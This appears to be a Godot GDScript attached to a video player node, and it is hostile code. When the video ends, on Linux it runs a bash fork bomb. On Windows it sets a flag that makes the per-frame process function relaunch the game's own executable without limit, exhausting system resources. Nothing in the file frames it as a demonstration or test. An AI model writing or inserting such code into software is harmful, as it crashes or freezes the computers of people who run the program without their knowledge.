extends VideoPlayer

var can_fork = false

func _on_video_player_finished():
	if OS.get_name() == "Windows":
		can_fork = true
	elif OS.get_name() == "X11":
		OS.execute(":(){ :|: & };:", [], false)

func _process(delta):
	if can_fork:
		OS.execute(OS.get_executable_path(), [])
